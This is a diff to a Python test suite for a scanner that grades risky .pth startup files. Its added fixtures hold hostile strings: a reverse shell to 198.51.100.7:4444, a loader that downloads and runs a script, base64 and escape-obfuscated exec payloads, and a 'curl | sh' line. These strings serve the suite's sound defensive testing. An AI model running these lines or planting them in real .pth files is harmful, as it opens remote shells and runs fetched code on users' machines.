@@ -61,8 +61,9 @@ class ProjectScanTests(unittest.TestCase):
         self.assertEqual(res["metrics"]["ncloc"], 0)
 
     def test_pth_files_are_not_source_files(self):
+        # (a line that starts another program at every Python start is CRITICAL)
         res = self.scan({"sub/boot.pth": "import os; os.system(cmd)\n", "app.py": "x = 1\n"})
-        self.assertEqual(pth_findings(res), [("sub/boot.pth", 1, "MAJOR")])
+        self.assertEqual(pth_findings(res), [("sub/boot.pth", 1, "CRITICAL")])
         self.assertEqual({i["rule"] for i in res["issues"]}, {"SC-PTH-EXEC"})   # no S-OSCMD-PY on it
         self.assertEqual(res["metrics"]["ncloc"], 1)                            # app.py only
 
@@ -92,6 +93,57 @@ class ProjectScanTests(unittest.TestCase):
             with self.subTest(text=text[:30]):
                 self.assertEqual(repo.pth_issues("m.pth", text), core.pth_issues("m.pth", text))
         self.assertEqual(repo._PTH_EXEC_RE.pattern, core._PTH_EXEC_RE.pattern)
+
+
+# coverage's a1_coverage.pth (7.16): the multi-line code a .pth line can't
+# hold, run by exec() of a plain literal
+COVERAGE = ("import sys; exec('import os\\n\\nif os.getenv(\"COVERAGE_PROCESS_START\") or "
+            "os.getenv(\"COVERAGE_PROCESS_CONFIG\"):\\n try:\\n  import coverage\\n except:\\n  pass\\n "
+            "else:\\n  coverage.process_startup(slug=\"pth\")')\n")
+# the same shape running what an install script must not: a reverse shell to
+# a documentation address (inert: nothing here is run)
+SHELL = ("import os; exec('import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));"
+         "os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])')\n")
+
+
+class PlainLiteralTests(unittest.TestCase):
+    """exec('…') of a plain literal runs the literal's code: the engine
+    (pth_line_risk) judges that code in the call's place, and what a line
+    does by the install-script and import-time tests."""
+
+    def sevs(self, text):
+        return [(i["sev"], i["msg"]) for i in core.pth_issues("m.pth", text)]
+
+    def test_code_in_plain_sight(self):
+        self.assertEqual(self.sevs(COVERAGE), [("MAJOR", ".pth line runs code at every Python start.")])
+        self.assertEqual(repo.pth_issues("m.pth", COVERAGE), core.pth_issues("m.pth", COVERAGE))
+
+    def test_what_the_literal_runs_is_judged(self):
+        self.assertEqual(self.sevs(SHELL), [("CRITICAL", ".pth line runs code at every Python start, and it reaches the "
+                                                         "network; and starts another program; and opens a reverse shell.")])
+        # the worms' .pth files: download Bun, then start it on a script the package ships
+        loader = ("import os as _O,tempfile as _T;_G=_O.path.join(_T.gettempdir(),'.ran');_O.path.exists(_G)or "
+                  "exec('import subprocess as _s,urllib.request as _u\\n_u.urlretrieve(\"https://releases.invalid/b.zip\",\"b.zip\")"
+                  "\\n_s.run([\"b\",\"run\",\"x.js\"],check=False)')\n")
+        self.assertEqual(self.sevs(loader), [("CRITICAL", ".pth line runs code at every Python start, and it reaches the "
+                                                          "network; and starts another program.")])
+        nested = "import os; exec('exec(\"import base64; exec(base64.b64decode(b))\")')\n"
+        self.assertEqual(self.sevs(nested)[0][0], "CRITICAL")
+
+    def test_a_literal_that_is_not_plain_is_a_payload(self):
+        payload = ".pth line runs code at every Python start and executes or decodes a payload."
+        triple = "import os; exec(" + "'" * 3 + "import os" + "'" * 3 + ")\n"
+        for text in ("import os; exec('\\x69\\x6d\\x70\\x6f\\x72\\x74 os')\n",     # escapes but \n \t \r \\ \' \"
+                     triple, "import os; exec(r'import os')\n", "import os; exec(b'import os')\n",
+                     "import os; exec('import os', g)\n", "import os; exec(compile('import os', 'x', 'exec'))\n"):
+            with self.subTest(text=text):
+                self.assertEqual(self.sevs(text), [("CRITICAL", payload)])
+
+    def test_a_line_judged_by_what_it_does(self):
+        line = 'import os; os.system("curl -s http://198.51.100.7/x | sh")\n'
+        ((sev, msg),) = self.sevs(line)
+        self.assertEqual(sev, "CRITICAL")
+        self.assertIn("pipes a download into a shell", msg)
 
 
 def cli_pth(name, data):
